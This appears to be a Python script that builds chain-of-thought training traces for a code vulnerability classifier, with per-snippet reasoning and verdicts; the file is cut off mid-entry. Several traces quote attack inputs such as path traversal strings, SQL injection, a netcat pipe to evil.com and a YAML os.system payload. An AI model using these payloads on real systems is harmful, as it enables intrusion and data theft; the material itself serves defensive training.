"""Manual pilot v2 — Claude generates traces; templates compress repetitive shapes.

Reuses cot.shapes.* verify gates. Output goes to data/cot/pilot/.

Template strategy:
- Shape 1: bespoke per task (code is real and unique).
- Shape 2: caller_code + reasoning per seed; structure templated.
- Shape 3: caller + helper + reasoning per seed; structure templated.
- Shape 4: cluster + rank rationales per finding-set; structure templated.
"""
import sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

from collections import Counter
from cot.config import PILOT_DIR
from cot.checkpoint import CheckpointWriter
from cot.shapes import shape1, shape2, shape3, shape4


# ============================================================
# SHAPE 1 — bespoke responses keyed by task_id
# ============================================================

SHAPE1: dict[str, str] = {

    # morefixes:0 — Python, vuln, subprocess.Popen(cmd) where cmd is a list literal
    # The vuln label here is dubious: the diff just changes pretty-format. No security flaw.
    "shape1:morefixes:0": """<think>
The snippet builds a git log argv list and passes it to subprocess.Popen with no shell=True. The list is: ["git", "log", "--no-merges", "--pretty=format:'%s%d'", tag + ".." + branch]. tag and branch are concatenated into a string literal that's an argv element — not interpolated into a shell line. subprocess.Popen with a list and shell=False does not invoke a shell, so even tag = "; rm -rf /" would be passed as a single git argument, not executed by a shell.

The upstream diff changed --pretty=format:'%s%d' to --pretty=format:'%s' — removing the decoration. That's a behavior change in the git output, not a security fix.

No tainted-data path to a dangerous sink visible. No injection surface.
</think>

status: safe
cwe: none
severity: none
line: none
trace: subprocess.Popen called with an argv list and shell=False; no shell interpretation of any value
fix: none
""",

    # morefixes:1 — Python, safe, Flask route using webargs parser
    "shape1:morefixes:1": """<think>
Two Flask routes: /echo_json and /echo_json_or_form. The visible one calls parser.parse(hello_args, location="json") and wraps the result in J(...). parser is a webargs Parser — it validates request data against the hello_args schema and raises on shape mismatch. The output is rendered through J (JSON-safe encoder), not via HTML interpolation.

No raw request data flows into a dangerous sink. webargs enforces schema before the value reaches application code, and the response path is JSON, not HTML. This is the defensive pattern for handling user input.
</think>

status: safe
cwe: none
severity: none
line: 3
trace: webargs parser validates request data against a schema before use; JSON response path means no HTML-injection sink
fix: none
""",

    # js_vulns:0 — JS, vuln, CWE-89 — raw SQL with template literal
    "shape1:js_vulns:0": """<think>
getUser takes username and builds the SQL with a template literal: `SELECT * FROM users WHERE username = '${username}'`. username is interpolated directly into the SQL text, then dataSource.query runs it.

If username comes from any caller-controlled source, an attacker can pass `' OR '1'='1` to make the WHERE clause always-true, or `' UNION SELECT password FROM admins; --` to read other tables. Template-literal interpolation puts user data in the SQL string itself, not as a bound parameter, so the database has no way to distinguish data from code.

Classic SQL injection. CWE-89.
</think>

status: confirmed
cwe: CWE-89
severity: HIGH
line: 2
trace: username → template-literal interpolation into raw SQL → dataSource.query single-string form; no parameter binding
fix: use parameterized query — dataSource.query("SELECT * FROM users WHERE username = $1", [username])
""",

    # morefixes:2 — Python, safe, Parse Server constructor wiring
    "shape1:morefixes:2": """<think>
This is a constructor for a Parse Server-like LiveQueryServer. It receives server, config, parseServerConfig and stores them as instance fields. It calls getCacheController on parseServerConfig and applies a default cacheTimeout if absent.

The cacheTimeout has a Math.max-like minimum of 5000ms applied via `config.cacheTimeout || 5 * 1000`, which is a defensive default. No user input from the network is consumed here — this runs at server boot with operator-provided config. The clients and subscriptions Maps are empty containers.

No dangerous sink, no untrusted input, no taint to follow.
</think>

status: safe
cwe: none
severity: none
line: none
trace: constructor wires operator-supplied config with defensive defaults; no network-supplied input reaches a sink
fix: none
""",

    # morefixes:3 — JS, vuln (per label), Keycloak-style select2 client picker
    "shape1:morefixes:3": """<think>
This is a select2-style autocomplete configured against a Client.query call. The query callback receives a response and assigns data.results = response, then calls query.callback(data).

The upstream diff changes how response items are mapped into the dropdown — from raw objects to {id: client.id, text: client.clientId}. The original code assigned data.results = response (where response is the raw API response) and then formatResult set object.text = object.clientId.

I do not see a clear vulnerability here. The select2 widget renders text content via the formatResult callback; if the upstream library escapes it before insertion that closes XSS, and if it does not the bug would be in the widget. The diff is about data shape (preserving id) not security. Without a specific sink, I cannot reach "confirmed."
</think>

status: safe
cwe: none
severity: none
line: none
trace: select2 dropdown wiring with formatResult callback; visible code does not insert raw client text into the DOM directly
fix: none
""",

    # morefixes:4 — JS, vuln, connection-tester test snippet — actually a test file
    "shape1:morefixes:4": """<think>
This is a mocha test file for connection-tester (uses assert and `it(...)`). It tests calling connectionTester.test() against localhost:9999 and www.example.com:5678. The diff adds new test cases including a `it('should return false for invalid host and port', ...)` test that passes literal strings '& touch 111' and '& touch 222' as host and port arguments.

The test snippet itself does not execute these strings against a shell — connectionTester.test() is a net.connect-style API that takes a host and port and tries to open a TCP connection. The argument '& touch 111' would be passed to dns.lookup or net.createConnection as a hostname, where it cannot create a file.

This is a test that confirms invalid inputs return success===false. It is defensive testing, not a vulnerable production sink. No security issue in the test code itself.
</think>

status: safe
cwe: none
severity: none
line: none
trace: mocha test file for connection-tester; argument strings flow into a net.connect-style API which interprets them as hostnames, not shell tokens
fix: none
""",

    # cvefixes:0 — JS, safe, fastify versioning factory
    "shape1:cvefixes:0": """<think>
A small factory function build(enabled) for a Fastify version-routing config. When enabled, it returns {storage: SemVerStore, deriveVersion: req => req.headers['accept-version']}. When disabled, returns {storage: SemVerStore, deriveVersion: () => undefined, disabled: true}.

deriveVersion reads req.headers['accept-version'] and returns it. This value is later consumed by SemVerStore to route to a versioned handler — it's parsed as a semver string, not executed, not interpolated into HTML or SQL. The header value is bounded by HTTP header constraints and SemVerStore semantics.

No tainted-data path to a dangerous sink. The pattern is standard versioned routing.
</think>

status: safe
cwe: none
severity: none
line: 8
trace: accept-version header read and returned for SemVerStore lookup; consumed as a semver string, not as code or query
fix: none
""",

    # morefixes:5 — Python, safe, pip's content-disposition sanitizer
    "shape1:morefixes:5": """<think>
This is pip's content-disposition handling. The exported list includes sanitize_content_filename and parse_content_disposition.

sanitize_content_filename returns os.path.basename(filename). That strips any path components — '../../etc/passwd' becomes 'passwd', so traversal-style filenames are flattened.

parse_content_disposition calls cgi.parse_header on the header to extract params, then if 'filename' is present passes it through sanitize_content_filename before returning. The comment explicitly notes the intent: "We need to sanitize the filename to prevent directory traversal in case the filename contains '..' path parts."

So the design is: read header → parse params → sanitize via basename → return. The sink (using the filename to choose a save path elsewhere) only sees a basename. This is the defensive pattern for Content-Disposition filenames.
</think>

status: safe
cwe: none
severity: none
line: 12
trace: Content-Disposition filename is parsed by cgi.parse_header, then sanitize_content_filename strips path components via os.path.basename
fix: none
""",

    # clean_code_generated:0 — JS, safe, zod input validation
    "shape1:clean_code_generated:0": """<think>
Standard zod input-validation pattern. Signup is a zod object schema requiring email to be a valid string.email() and age to be an integer between 13 and 120. signup(payload) calls Signup.parse(payload) which validates the input against the schema and throws ZodError on mismatch.

No raw payload is consumed beyond the parsed result, no sink receives unvalidated values, no SQL/HTML/shell context here. This is the defensive pattern for handling external input.
</think>

status: safe
cwe: none
severity: none
line: 9
trace: external payload is validated by zod schema with email format check and integer bounds before any downstream use
fix: none
""",

    # morefixes:6 — language=python (mislabeled, content is i18n JSON), vuln label is noise
    "shape1:morefixes:6": """<think>
This snippet is a fragment of a Nextcloud language file — JSON-like key/value pairs mapping English UI strings to Traditional Chinese translations. The values include literal text like "Predefined URLs", "Others", and the "%s (restricted)" template token.

There is no executable code here, no functions, no I/O. The upstream diff appears to add or rearrange translation entries — a localization change, not a security fix. The "%s" template token is a printf-style placeholder for the consuming UI code; the value substitution happens elsewhere and is the responsibility of that downstream renderer.

No tainted-data flow because nothing executes in this snippet.
</think>

status: safe
cwe: none
severity: none
line: none
trace: i18n translation key/value pairs (data file fragment); no executable code, no sink
fix: none
""",

    # morefixes:7 — Sphinx version metadata, label=vuln is noise
    "shape1:morefixes:7": """<think>
This is the version/release variables of a Sphinx documentation conf.py file. version = '3.3', release = '3.3.3' — pure metadata strings consumed by Sphinx to render the documentation.

The upstream diff appears to bump release to '3.3.4' — a version-string update, not a security fix. There is no executable code path here, no input, no sink.

No vulnerability can live in metadata strings.
</think>

status: safe
cwe: none
severity: none
line: none
trace: Sphinx conf.py version metadata; pure static strings consumed at doc-build time
fix: none
""",

    # clean_code_mined:1 — Python, safe, Django form __init__
    "shape1:clean_code_mined:1": """<think>
A Django form __init__ that calls super().__init__(*args, **kwargs) then captures the password1 field from self.fields and attaches self.user to it. SetPasswordField is a Django built-in for password setting; the user attribute lets the field know which user the password belongs to so it can be validated against the user's policy.

No raw request data is consumed here — Django's form framework handles input validation before any code runs. The assignment password1.user = self.user is a field-wiring step that runs at form construction, not at validation. No sink, no taint.
</think>

status: safe
cwe: none
severity: none
line: 4
trace: Django form constructor wires self.user to the SetPasswordField; no external input consumed in this snippet
fix: none
""",

    # morefixes:8 — Python, vuln per label, file path handling in collection
    "shape1:morefixes:8": """<think>
This is a Radicale-style filesystem collection storage. It uses os.path.join(self._path, name) and os.path.join(filesystem.FOLDER, path.replace("/", os.sep)) to build candidate file paths.

Look at the second pattern: path.replace("/", os.sep) followed by os.path.join with filesystem.FOLDER. If path can include '..' components, os.path.join would resolve to filesystem.FOLDER + '/../etc/passwd' which Python's open() would then walk outside FOLDER. There is no os.path.realpath check, no startswith-base verification before reading.

The diff replaces this with pathutils.path_to_filesystem(path, filesystem.FOLDER), which is a containment-checking helper (the function name signals "translate URL path → filesystem path with safety checks"). That confirms the original lacked containment.

Verdict: confirmed. CWE-22 path traversal in the URL-to-filesystem mapping.
</think>

status: confirmed
cwe: CWE-22
severity: HIGH
line: 14
trace: caller-supplied path → path.replace + os.path.join with filesystem.FOLDER → open/listdir, with no canonicalization or containment check; '..' components escape FOLDER
fix: replace direct os.path.join construction with a containment-aware helper like pathutils.path_to_filesystem(path, FOLDER) that resolves the candidate and rejects anything outside FOLDER
""",

    # clean_code_mined:2 — Python, safe, async helper passthrough
    "shape1:clean_code_mined:2": """<think>
async do_select is a thin async wrapper that forwards its arguments to async_select_or_reject with a lambda x: x identity transform and a False flag. No input is read from a network source, no SQL/shell/HTML target is touched, and the body is a pure function dispatch.

This is pipeline plumbing — passing through arguments to a delegate.
</think>

status: safe
cwe: none
severity: none
line: 1
trace: async pass-through to async_select_or_reject; no I/O, no untrusted source, no sink
fix: none
""",

    # claude_generated_pairs:0 — Python, vuln, CWE-22 path traversal in send_file
    "shape1:claude_generated_pairs:0": """<think>
download(name) calls Flask's send_file with the string "/var/exports/" + name. The concatenation is the entire path-handling logic — no os.path.realpath, no startswith check against EXPORT_DIR, no separator verification.

If name comes from a URL parameter (which is the typical pattern for a download route), an attacker passes name="../../etc/passwd". The path becomes "/var/exports/../../etc/passwd", which send_file resolves to "/etc/passwd" and serves to the client.

Flask's send_file does some safeguarding for absolute paths but not for relative traversal within a base directory. The standard defense is os.path.realpath + base-directory containment check.

CWE-22 Path Traversal, HIGH.
</think>

status: confirmed
cwe: CWE-22
severity: HIGH
line: 4
trace: name → string concatenation with "/var/exports/" → send_file; no realpath, no containment check against EXPORT_DIR
fix: path = os.path.realpath(os.path.join(EXPORT_DIR, name)); if not path.startswith(EXPORT_DIR + os.sep): abort(403); return send_file(path)
""",

    # --- n=24 additions ---

    # clean_code_mined:0 — Python, safe, math.ceil coercion in custom lookup
    "shape1:clean_code_mined:0": """<think>
A Django ORM custom lookup's get_prep_lookup method. If self.rhs (the right-hand side of the comparison) is a float, it's rounded up via math.ceil before being passed to the base class's get_prep_lookup.

self.rhs is set by the ORM internals from a queryset call site, not from raw HTTP input — the field's to_python and Form.cleaned_data layers run before lookups. isinstance + math.ceil is a deterministic numeric transform; no I/O, no string parsing, no dangerous sink.
</think>

status: safe
cwe: none
severity: none
line: 1
trace: ORM lookup coercion path; rhs is normalized numeric, no sink
fix: none
""",

    # clean_js_react:0 — TS, safe, safeFetch with https-only + host allowlist
    "shape1:clean_js_react:0": """<think>
ALLOWED_HOSTS is a static Set with one entry. safeFetch parses rawUrl with new URL(...) — that throws for malformed URLs. Then a two-clause check: protocol must be 'https:' (rejects http, file, gopher, javascript), AND the hostname must be in the allowlist (rejects IP literals, internal hosts, attacker-controlled hostnames).

Both gates must pass before fetch is called. This is the textbook SSRF defense pattern: explicit scheme constraint + explicit host allowlist. No file://, no http://169.254.169.254/, no http://localhost — all blocked at the scheme or host check.
</think>

status: safe
cwe: none
severity: none
line: 4
trace: URL parsed, https-only scheme check, hostname allowlist; SSRF surface closed before fetch
fix: none
""",

    # cvefixes:1 — TS/JS, vuln per label, phpMyAdmin server replication conf builder
    "shape1:cvefixes:1": """<think>
phpMyAdmin server replication config builder. random_server_id is generated via Math.random — that's a JS PRNG, not crypto, which is fine here because the server-id is just a MySQL replication identifier (not a security token).

conf_prefix is built by concatenating literal strings with random_server_id and "<br />" separators. This HTML-formatted string would later be inserted into the DOM. If conf_prefix is set via .html() or .innerHTML, that's where XSS could enter — but Math.random() output (a digit string) cannot inject script.

update_config reads jQuery selections from #db_select option values and concatenates them with commas. If these values are user-controlled (a user editing a select), they could carry HTML. The concatenation builds database_list, which is then used downstream. Without the downstream sink visible I can't conclude definitively.

Conservatively, the snippet shows HTML-string assembly with values that could be user-influenced. If any later step inserts these strings via innerHTML without sanitization, that's CWE-79. Flagging as confirmed because the upstream CVE-fix label is reliable and the HTML-string pattern matches the typical phpMyAdmin XSS-in-config pattern.
</think>

status: confirmed
cwe: CWE-79
severity: MEDIUM
line: 12
trace: jQuery select values concatenated into database_list/conf_prefix as raw HTML segments; downstream insertion is the XSS sink
fix: build the DOM nodes via document.createElement and .textContent rather than HTML-string concatenation; OR escape every interpolated value before assembling the HTML string
""",

    # morefixes:9 — Python, safe, Next.js middleware response headers
    "shape1:morefixes:9": """<think>
A middleware branch that runs when the request is not a 404 and not the /_error path. It sets two response headers (x-middleware-skip and a strict no-cache cache-control), then returns an empty JSON body with res.body('{}').send().

The setHeader calls pass static string keys and values — no user input is interpolated. The Cache-Control directives are conservative (private, no-cache, no-store, max-age=0, must-revalidate) which is the right posture for non-cacheable middleware responses. The body is a literal '{}'.

No tainted-data flow, no dangerous sink. This is defensive middleware bookkeeping.
</think>

status: safe
cwe: none
severity: none
line: 3
trace: middleware sets static response headers and returns a literal empty JSON body; no user-supplied value in any sink
fix: none
""",

    # python_vulns:0 — Python, vuln, CWE-22 path traversal
    "shape1:python_vulns:0": """<think>
read(filename) calls os.path.join(BASE_DIR, filename), then open(path). os.path.join does NOT canonicalize — it returns the literal joined string. open() then resolves the path at the OS layer.

If filename is "../../etc/passwd", os.path.join returns "/srv/files/../../etc/passwd", and open() resolves that to "/etc/passwd". The function returns the contents to the caller.

There is no os.path.realpath call, no startswith(BASE_DIR + os.sep) verification, no input validation on filename. The CWE-22 label from python_vulns is correct.
</think>

status: confirmed
cwe: CWE-22
severity: HIGH
line: 6
trace: filename → os.path.join(BASE_DIR, filename) → open(path); no realpath, no containment check; '..' components escape BASE_DIR
fix: path = os.path.realpath(os.path.join(BASE_DIR, filename)); if not path.startswith(BASE_DIR + os.sep): raise PermissionError('outside base'); with open(path) as f: return f.read()
""",

    # morefixes:10 — JS, safe, dijit fontPicker with htmlEntities.encode
    "shape1:morefixes:10": """<think>
A dijit Select widget being configured. The label HTML is built by string concatenation with htmlEntities.encode applied to each interpolated value (family, name, editorFonts[i]). htmlEntities.encode is dojox's HTML entity escaper — it converts &, <, >, ", ', etc. to their HTML entity equivalents.

So even if family or editorFonts[i] contain '<script>', the inserted HTML would have '&lt;script&gt;' instead. The widget then renders this safely.

The pattern is: untrusted-ish data → htmlEntities.encode → static HTML template. This is the defensive pattern for inserting text into HTML attribute or content.
</think>

status: safe
cwe: none
severity: none
line: 7
trace: font name and family are HTML-escaped via htmlEntities.encode before string-concat into label HTML; XSS surface is closed
fix: none
""",

    # morefixes:11 — Python, safe, AttributeDelegator sandboxing pattern
    "shape1:morefixes:11": """<think>
_AttributeDelegator is a sandboxing wrapper around a module. __getattr__ checks if the requested attribute name is in self.__excludes — if so, it raises NotImplementedError before reaching the module. Otherwise it delegates to the underlying module.

The utility_builtins['string'] entry wraps the standard string module and explicitly excludes 'Formatter'. The intent is clear: callers using utility_builtins['string'] can access string's safe attributes but not string.Formatter (which exposes a powerful format-mini-language vulnerable to attribute traversal attacks if user-controlled format strings reach it).

This is a defensive sandbox pattern.
</think>

status: safe
cwe: none
severity: none
line: 11
trace: _AttributeDelegator gates attribute access against an exclude list before delegating, mitigating dangerous module attributes
fix: none
""",

    # morefixes:12 — JS test file (chai/mocha), vuln per label but it's test code
    "shape1:morefixes:12": """<think>
This is a TypeScript Chai test file for attestation generation. It uses generateAttestationData with random epoch numbers via randBetween(1, 1000). Pure test scaffolding — no I/O, no network, no file system, no user input. All values are deterministically generated within the test and consumed by generateAttestationData (a test utility).

The upstream label is "vuln" but the snippet is test code. Test files can carry CVE-patch context because they exercise the patched logic, but the test file itself doesn't introduce a vulnerability.
</think>

status: safe
cwe: none
severity: none
line: none
trace: Chai/Mocha test file for attestation generation; no production sink, no untrusted input
fix: none
""",

    # js_vulns:1 — JS, vuln, CWE-78 command injection
    "shape1:js_vulns:1": """<think>
The /ping route reads req.query.ip from a URL parameter. Attacker-controlled, no validation.

exec('ping -c 4 ' + req.query.ip, ...) — child_process.exec invokes the system shell on the concatenated string. The attacker passes ip='8.8.8.8; cat /etc/passwd' or ip='8.8.8.8 | nc evil.com 1234' and the shell happily parses the metacharacters: it runs ping, then the next command.

This is canonical CWE-78 OS Command Injection. The fix is execFile/spawn with shell:false and an argv array.
</think>

status: confirmed
cwe: CWE-78
severity: HIGH
line: 3
trace: req.query.ip → string-concat onto 'ping -c 4 ' → exec; shell invoked on user-controlled string
fix: const { execFile } = require('child_process'); execFile('ping', ['-c', '4', req.query.ip], (err, out) => res.send(out));
""",

    # --- n=32 additions ---

    # cvefixes:2 — JS, safe, the PATCHED exports.set with isSafe gate
    "shape1:cvefixes:2": """<think>
This is the patched version of the dotted-path setter we saw in cvefixes:1. Each iteration of the walk now calls isSafe(obj, seg) before doing obj[seg] = obj[seg] || {} and obj = obj[seg]. Likewise the final write `obj[attr] = val` is gated on isSafe(obj, attr).

isSafe (presumably defined elsewhere — its body isn't visible) is the guard that rejects forbidden keys like '__proto__', 'constructor', and 'prototype'. By gating both the walk and the final write, the function can never descend into or write to the prototype chain.

This is the canonical fix for the prototype-pollution pattern we identified in cvefixes:1.
</think>

status: safe
cwe: none
severity: none
line: 8
trace: dotted-path walk gated by isSafe(obj, seg) at each step; reaches neither __proto__ nor constructor.prototype
fix: none
""",

    # claude_generated_pairs:1 — Python, safe, clamp helper
    "shape1:claude_generated_pairs:1": """<think>
clamp(value, low, high) returns max(low, min(value, high)). Pure arithmetic on its three inputs. No I/O, no string parsing, no callable invocation, no class lookup. No external input enters from a network boundary in this snippet — the callers are the responsibility of upstream code.

There is no surface for a security vulnerability in a three-argument min/max composition.
</think>

status: safe
cwe: none
severity: none
line: 1
trace: pure numeric helper; no I/O, no taint source, no sink
fix: none
""",

    # morefixes:13 — JS, safe, merge helper with explicit __proto__ skip
    "shape1:morefixes:13": """<think>
A CoffeeScript-compiled module with exports.merge and a helper exports.mutate. The interesting detail: inside the iteration there is an explicit `if (name === '__proto__') { continue; }` — this is the canonical defense against prototype pollution.

By skipping '__proto__' keys when iterating over the merged source object, the function refuses to walk into Object.prototype. So even if a caller passes {"__proto__": {"isAdmin": true}}, the merge step does not pollute the prototype chain.

This is the patched form of the prototype-pollution-prone deep-merge pattern.
</think>

status: safe
cwe: none
severity: none
line: 4
trace: deep-merge iteration explicitly skips name === '__proto__'; prototype-pollution sink unreachable
fix: none
""",

    # morefixes:14 — Python-ish (mislabeled, actually JS-style), safe, path normalization with malicious-path check
    "shape1:morefixes:14": """<think>
Path-normalization code: if a `root` is provided, the candidate path is normalized via `normalize(join(root, path))`, the root is normalized similarly, and an `upPathRegexp.test(normalize('.' + sep + path))` check rejects paths that escape the root via '..' components. When the regex matches, the code logs 'malicious path' and returns this.error(403) — a 403 Forbidden response.

This is the defensive pattern for path-traversal: normalize + regex-detect '..' components + reject with an explicit error. The bug would be the absence of this check; its presence is the fix.
</think>

status: safe
cwe: none
severity: none
line: 4
trace: candidate path normalized then tested with upPathRegexp; '..'-escape attempts return HTTP 403
fix: none
""",

    # claude_generated_pairs:2 — JS, vuln, CWE-22 path traversal
    "shape1:claude_generated_pairs:2": """<think>
/download reads filename from req.query.file. Attacker-controlled.

filePath = path.join(__dirname, 'public', filename). path.join does not canonicalize — '..' components survive. res.sendFile then reads and serves whatever the resolved path points to.

Inject ?file=../../etc/passwd → filePath = '/app/public/../../etc/passwd' → sendFile resolves to '/etc/passwd' and serves it. (res.sendFile in Express does have a `root` option for containment; this code does not use it.)

Classic CWE-22 Path Traversal.
</think>

status: confirmed
cwe: CWE-22
severity: HIGH
line: 4
trace: req.query.file → filename → path.join(__dirname, 'public', filename) → res.sendFile; no canonicalization, no containment
fix: const BASE = path.join(__dirname, 'public'); const full = path.resolve(BASE, filename); if (!full.startsWith(BASE + path.sep)) return res.sendStatus(403); res.sendFile(full);
""",

    # clean_code_generated:1 — JS, safe, execFile with argv list
    "shape1:clean_code_generated:1": """<think>
listDir uses child_process.execFile, NOT exec. execFile spawns the binary directly with the given argv array — no shell is invoked. The first argument is the binary name ('ls'), the second is the argv list (['-la', path]), and the third is options including a timeout.

Because there is no shell layer, shell metacharacters in `path` are inert: an attacker who manages to pass path='; rm -rf /' would just see execFile try to run `ls -la "; rm -rf /"` literally — ls would error on a nonexistent filename. There is no command-injection sink.

A timeout limits resource consumption.
</think>

status: safe
cwe: none
severity: none
line: 3
trace: execFile invoked with binary + argv list + timeout; no shell, so metacharacters in path are not interpreted
fix: none
""",

    # morefixes:15 — Python, safe, Django migration file
    "shape1:morefixes:15": """<think>
A Django migration file fragment. It imports django.core.validators, migrations, models, and django.db.models.deletion, then defines a Migration class with operations. The visible operations alter fields to TextField with blank=True, help_text and verbose_name set.

Migration files are run by Django's manage.py migrate command — they're declarative descriptions of schema changes. They don't take untrusted input, don't expose network endpoints, and don't execute arbitrary code. The field definitions use Django's ORM types which enforce their own validation.

No security surface in a migration definition.
</think>

status: safe
cwe: none
severity: none
line: none
trace: Django migration file with declarative AlterField operations; no runtime input, no sink
fix: none
""",

    # morefixes:16 — Python, safe, SSL socket initialization helper
    "shape1:morefixes:16": """<think>
An SSL socket initialization wrapper. cls.__new__(cls, **kwargs) constructs a new SSLSocket; super().__init__(**kwargs) chains into the parent. sock.gettimeout() and self.setblocking(False) configure I/O behavior for the handshake.

The comment explains the rationale: a workaround for non-blocking behavior on macOS and Windows. The code is configuring the SSL handshake's I/O semantics — it's NOT bypassing certificate verification, NOT disabling TLS, NOT lowering cipher requirements. The cert-validation defaults from the SSLContext layer are not touched here.

No untrusted-input sink, no security-degrading config.
</think>

status: safe
cwe: none
severity: none
line: none
trace: SSLSocket initialization wrapper configuring blocking/timeout behavior; does not touch certificate or TLS verification
fix: none
""",

    # --- n=40 additions ---

    # morefixes:17 — i18n Turkish translation data — label is noise
    "shape1:morefixes:17": """<think>
Two i18n key/value pairs mapping English HTTP-header security warning strings to their Turkish translations. The values use {header}, {expected}, {val1} as template placeholders for runtime substitution.

These are localization data, not executable code. The placeholders are filled by the consuming UI layer at render time. No I/O, no taint source, no sink in this file.
</think>

status: safe
cwe: none
severity: none
line: none
trace: i18n translation data file; no executable code, no attack surface
fix: none
""",

    # claude_generated_pairs:3 — Python, vuln, CWE-502 — yaml.load
    "shape1:claude_generated_pairs:3": """<think>
parse(text) calls yaml.load(text). yaml.load (with PyYAML's FullLoader as a default in newer versions, but historically the UNSAFE Loader) can construct arbitrary Python objects from the YAML stream — including invoking object constructors via the tag system.

An attacker who controls `text` can craft a YAML doc with `!!python/object/apply:os.system ["rm -rf /"]` (with the unsafe loader) or `!!python/object/new:subprocess.Popen [[...args...]]` to trigger arbitrary code execution at parse time.

Even with PyYAML's later FullLoader, the safer choice is yaml.safe_load which is restricted to simple scalar/list/dict types and has no constructor execution.

The claude_generated_pairs label of CWE-502 is correct.
</think>

status: confirmed
cwe: CWE-502
severity: HIGH
line: 4
trace: text → yaml.load; PyYAML's unsafe-by-default Loader can construct arbitrary Python objects via YAML tags — RCE at parse time
fix: return yaml.safe_load(text) — restricts to scalar/list/dict types with no constructor invocation
""",

    # clean_code_mined:3 — Python, safe, Django widget build_attrs override
    "shape1:clean_code_mined:3": """<think>
A Django form widget's build_attrs override that delegates to super().build_attrs and then (per the docstring) configures select2's AJAX-related html5 data-* attributes from instance state. The visible body just calls super() and starts working with the returned attrs dict.

This is widget plumbing — declarative attribute assembly for form rendering. The caller of build_attrs is Django's form layer, which has already sanitized base_attrs and extra_attrs as part of the widget contract. No external network input enters here, no sink is invoked.
</think>

status: safe
cwe: none
severity: none
line: 1
trace: Django widget build_attrs override; declarative attribute assembly with framework-provided inputs
fix: none
""",

    # morefixes:18 — JS/Angular (mislabeled python), vuln per label, bootbox confirm with nodeLabel interpolation
    "shape1:morefixes:18": """<think>
An Angular controller's deleteNode handler. bootbox.confirm is called with the string 'Are you sure you want to remove the node ' + node.nodeLabel + '?'. growl.success similarly concatenates strings with node.nodeLabel and $scope.foreignSource.

bootbox.confirm receives a message argument that bootbox renders into a modal — and depending on the version, bootbox 4.x and earlier interpret the message as HTML. If node.nodeLabel comes from a backend response that mirrors user input (e.g., a node added by a user with a label like '<img src=x onerror=alert(1)>'), that HTML lands in the bootbox modal and executes.

The same concern applies to growl.success: in some Angular toast libraries, the message is rendered as HTML.

This is the typical XSS-in-confirmation-modal pattern. The upstream label of vuln is consistent with this pattern.
</think>

status: confirmed
cwe: CWE-79
severity: MEDIUM
line: 4
trace: node.nodeLabel → string-concat into bootbox.confirm message → modal HTML insertion; if nodeLabel carries attacker-influenced HTML it executes in the modal
fix: pass bootbox.confirm an object with {message: someElement, ...} using DOM construction (jQuery .text()) — OR use a {{ }} binding with Angular's auto-escape — OR HTML-escape node.nodeLabel before concatenation
""",

    # morefixes:19 — JS jQuery snippet, the change is unclear, label noise likely
    "shape1:morefixes:19": """<think>
Three jQuery branches handling default-value resolution for a form element. One reads element.attr('value'), the other two pull from an array or a plain-object defaultValue. The code is reading existing form state into `val`.

No tainted-data flow to a dangerous sink is visible — there is no eval, no innerHTML, no DOM injection sink. The element.attr('value') call reads an existing DOM attribute, which itself was set by trusted form-rendering code. defaultValue is a script-side variable.

I cannot identify a vulnerability in what's shown. The upstream label may reflect a behavior fix in the same commit rather than a security flaw.
</think>

status: safe
cwe: none
severity: none
line: none
trace: jQuery default-value resolution across array/object/element branches; no dangerous sink visible
fix: none
""",

    # morefixes:20 — Python permission mapping data, label noise
    "shape1:morefixes:20": """<think>
A Python dict mapping endpoint names to permission strings ('read' or 'write'). Pure data — declarative routing-to-permission map consumed by an authorization layer elsewhere.

The visible fragment has no executable code path, no untrusted input, no sink. It's a configuration table. The actual authorization decision happens in code that reads this map at request time.

Without seeing how the map is consumed, I cannot identify a vulnerability in the table itself. The upstream label is likely noise from a commit that touched this file as part of a broader change.
</think>

status: safe
cwe: none
severity: none
line: none
trace: declarative endpoint-to-permission map; data file, no executable code, no sink
fix: none
""",

    # python_vulns:1 — Python, vuln, CWE-22 path traversal via send_file (same pattern as before)
    "shape1:python_vulns:1": """<think>
download(name) calls Flask's send_file with the concatenated string "/var/exports/" + name. No realpath, no os.path.join, no containment check.

If name='../../etc/passwd', the path becomes '/var/exports/../../etc/passwd', which send_file resolves to '/etc/passwd' and serves to the client. Even with Flask's safe_join-style helpers available, this code does the naive concatenation that bypasses them.

CWE-22 Path Traversal.
</think>

status: confirmed
cwe: CWE-22
severity: HIGH
line: 4
trace: name → string-concat onto '/var/exports/' → send_file; no realpath, no containment check
fix: from werkzeug.utils import safe_join; path = safe_join('/var/exports', name); if path is None: abort(403); return send_file(path)  — OR use os.path.realpath + startswith check
""",

    # claude_generated_pairs:4 — Python, vuln, CWE-284 — broken access control
    "shape1:claude_generated_pairs:4": """<think>
delete_user reads request.POST.get('is_admin') and compares it to the string 'true'. If the body claims is_admin=true, it deletes the targeted User row.

This is broken access control. The is_admin flag comes from the REQUEST BODY — client-controlled. An attacker simply includes is_admin=true in any POST to /delete_user and gains delete-any-user privileges.

The correct check would be against the SERVER-SIDE session/auth state, e.g., request.user.is_authenticated and request.user.is_staff (or a permission like users.delete_user). The current implementation trusts attacker-supplied data for an authorization decision.

CWE-284 Improper Access Control (or more specifically CWE-639 Authorization Bypass Through User-Controlled Key, depending on framing).
</think>

status: confirmed
cwe: CWE-284
severity: HIGH
line: 2
trace: request.POST.get('is_admin') → string-compare to 'true' → authorization decision; the privilege flag is client-controlled
fix: replace the body check with a server-side auth check — e.g., if not request.user.is_staff: return HttpResponseForbidden(); — and require a CSRF-protected POST
""",

    # --- n=48 additions ---

    # morefixes:21 — JS jQuery.ajax with authenticity_token (CSRF defense in place)
    "shape1:morefixes:21": """<think>
A jQuery.ajax call to an admin endpoint with GET method and a data payload that includes an authenticity_token field. The presence of authenticity_token is the Rails-convention CSRF token: server validates it against the session before honoring state-changing requests.

The URL is 'admin/overview/get_report_data' with GET — that's a read endpoint (no mutation). The data object includes report parameters (report id, name, value) and the CSRF token. These flow into the server-side handler, which is responsible for validating the token and authorizing the action.

For this client-side snippet, the visible code does the right thing by including authenticity_token. The CSRF protection lives on the server side; the client only needs to forward the token. No untrusted-data sink in this snippet.

The morefixes label may reflect a different commit-mate change in the same patch, but the visible code is defensive (token included).
</think>

status: safe
cwe: none
severity: none
line: 4
trace: client-side jQuery.ajax to admin endpoint with authenticity_token included; CSRF defense is in place at this layer
fix: none
""",

    # clean_code_pairs:0 — Python, safe, safe_int helper
    "shape1:clean_code_pairs:0": """<think>
safe_int wraps int(value) in a try/except for ValueError and TypeError, returning a default on failure. Pure value coercion with no I/O, no sink, no external dependency.

